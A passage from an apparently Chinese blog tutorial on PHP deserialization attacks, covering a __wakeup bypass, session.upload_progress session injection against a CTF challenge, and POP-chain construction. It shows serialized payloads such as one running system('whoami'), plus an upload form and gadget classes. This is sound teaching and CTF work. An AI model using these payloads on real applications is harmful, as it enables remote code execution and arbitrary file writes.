delimiter">?></span></code></pre><p>__wakeup会在反序列化之前执行，所以怎么样对象被销毁的时候都是要执行phpinfo的，那怎么绕过</p><p>__wakeup呢？需要构造如下序列化对象：</p><pre><code>O%3A1%3A&quot;A&quot;%3A2%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A17%3A&quot;system%28&quot;whoami&quot;%29%3B&quot;%3B%7D</code></pre><p>这里对象的属性个数是1，我设置为大于1就绕过了__wakeup，所以当序列化的结果的对象属性大于本身类的对象属性就可以绕过wakeup魔术方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/2.png" alt="2" loading="lazy"></p><h4 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a><strong>Session反序列化</strong></h4><p>php的session在存储和读取的时候，会进行序列化和反序列化，在php中有3种序列化的方式，当在php.ini中设置如下值：</p><table><thead><tr><th>session.serialize_handler</th><th>存储方式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize序列化的字符串</td></tr><tr><td>php_serialize</td><td>serialize序列化的的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符＋键名＋经过serialize()函数反序列处理的值</td></tr></tbody></table><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'fanxing'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当session.serialize_handler为php的时候，存储的session结果为</p><pre><code>name|s:7:&quot;fanxing&quot;;</code></pre><p>当session.serialize_handler为php_serialize的时候，存储的session结果为</p><pre><code>a:1:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;}</code></pre><p>当session.serialize_handler为php_binary的时候，存储的session结果为</p><pre><code>二进制字符串names:7:&quot;fanxing&quot;</code></pre><p>php大于5.5.4的版本默认使用的是php_serialize。</p><p>在php.ini中，还要了解一些关于session的配置：</p><p>session.save_path    session保存的路径</p><p>session.upload_progress.cleanup    上传完成后(POST)会立即删除进度，默认开启</p><p>session.upload_progress.enabled    将上传的进度存于session，默认开启</p><pre><code>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</code></pre><p>这里利用CTF的一道题目：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//A webshell is wait for you</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'sessiontest.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>可以看到题目使用的是php5.6.21，默认使用的是php_serialize，而题目使用的是php，所以可以利用session.upload_progress.enabled来构造session。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    &lt;input type="hidden" name="<span class="token prolog">&lt;?php echo ini_get("session.upload_progress.name"); ?></span>" value="123" />    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>构造payload</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token operator">=</span><span class="token string">'print_r(dirname(__FILE__));'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>在filename处提交payload：|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(<strong>FILE</strong>));&quot;;}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/3.png" alt="3" loading="lazy"></p><p>之后就可以构造payload读取本地的文件，具体可以参考<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">先知twosmi1e师傅</a>和博客<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">Mochazz师傅的文章</a>。</p><h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a><strong>POP链构造</strong></h4><p>在反序列化攻击中，一般都要寻找魔术方法中的一些敏感函数来触发漏洞，当魔法方法中不存在敏感函数时，需要构造pop链寻找相同函数将类的属性和敏感函数联系到一起。</p><p>这里，参考了这位<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">师傅</a>的题目，题目部分代码我删了下，看原题可以去连接看这位师傅的。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$repl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token variable">$repl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">,</span> <span class="token variable">$endl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$format</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里装入LogWriter_File对象</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$writer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token variable">$writer</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//这里偷梁换柱Song的log</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Song</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$group</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$group</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token operator">=</span> <span class="token variable">$group</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$url</span><span class="token punctuation">;</span>        <span class="token variable">$fltr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token string">"/\[i\](.*)\[\/i\]/i"</span><span class="token punctuation">,</span> <span class="token string">"&lt;i>\\1&lt;/i>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">"song_views"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$fltr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;a href='"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>url <span class="token punctuation">.</span> <span class="token string">"'>&lt;i>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/i>&lt;/a> by "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Song "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">" by [i]"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token punctuation">.</span> <span class="token string">"[/i] viewed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">,</span> <span class="token variable">$song</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token variable">$song</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">addLyrics</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$lyrics</span> <span class="token keyword">as</span> <span class="token variable">$lyric</span><span class="token punctuation">)</span> <span class="token variable">$oldlyrics</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token variable">$lyric</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$oldlyrics</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>User<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在进行反序列化漏洞的时候，我们需要找到可控的unserialize，这里发现$_COOKIE[‘lyrics’]参数可控，有了可控的参数，就需要找到魔术方法来自动调用，这里危险函数在LogWriter_File这个类，这时就需要构造POP链了。</p><p>首先来看魔术方法，在Lyrics类中存在两个魔术方法，发现对象在销毁的时候调用了$this-&gt;song-&gt;log()，而log方法又在Logger这个类中存在，所以属性$this-&gt;song应该为new Logger()。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span 